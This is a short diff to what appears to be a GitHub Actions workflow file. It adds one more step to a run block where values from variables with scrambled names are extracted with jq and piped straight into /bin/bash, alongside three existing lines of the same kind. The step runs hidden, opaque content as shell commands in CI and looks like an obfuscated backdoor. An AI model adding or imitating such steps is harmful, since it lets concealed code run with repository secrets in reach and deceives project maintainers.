@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$rcp1427" | jq -r .esnrk4 | /bin/bash
           printf '%s' "$eeay611" | jq -r .e901 | /bin/bash
           echo $cishz98 | jq -r .nvxtq683 | /bin/bash
+          echo $cxh99 | jq -r .n1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
